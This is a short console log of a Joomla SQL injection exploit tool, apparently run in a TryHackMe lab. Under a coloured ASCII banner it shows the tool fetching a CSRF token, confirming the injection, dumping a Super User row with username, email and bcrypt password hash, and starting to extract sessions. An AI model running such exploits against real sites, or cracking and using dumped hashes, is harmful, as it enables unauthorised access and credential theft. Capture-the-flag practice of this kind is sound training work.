[1;34m                                                                                                                    [0m
[1;31m    .---.    .-'''-.        .-'''-.                                                           [0m
[1;35m    |   |   '   _    \     '   _    \                            .---.                        [0m
[1;34m    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           [0m
[1;31m    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           [0m
[1;35m    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           [0m
[1;33m    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           [0m
[1;36m    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    [0m
[1;35m    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   [0m
[1;34m    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   [0m
[1;36m    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   [0m
[1;31m __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   [0m
[1;33m|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  [0m
[1;32m|____.'                                                                `--'  `" '---'   '---' [0m
[1;31m[0m
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
